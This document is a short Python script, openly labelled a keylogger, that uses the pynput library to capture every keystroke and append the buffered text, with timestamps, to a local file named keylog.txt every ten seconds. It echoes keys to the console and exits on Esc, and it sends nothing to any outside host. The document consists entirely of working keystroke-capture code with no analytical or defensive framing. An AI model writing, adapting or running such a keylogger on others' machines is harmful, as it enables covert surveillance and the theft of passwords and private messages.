from pynput import keyboard
import threading
import datetime


log = ""
log_file = "keylog.txt"
interval = 10  

def save_log():
    global log
    if log:
        with open(log_file, "a") as f:
            f.write(f"\n--- {datetime.datetime.now()} ---\n")
            f.write(log)
        log = ""
    
    timer = threading.Timer(interval, save_log)
    timer.daemon = True  
    timer.start()

def on_press(key):
    global log
    try:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "[ENTER]\n"
        elif key == keyboard.Key.tab:
            log += "[TAB]"
        elif key == keyboard.Key.backspace:
            log = log[:-1]
        elif key == keyboard.Key.esc:
            print("[*] Exiting keylogger...")
            return False  
        else:
            log += str(key.char)
    except AttributeError:
        log += f"[{key.name.upper()}]"

    
    print(f"Key pressed: {key}")


print("[*] Starting keylogger...")
save_log()


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
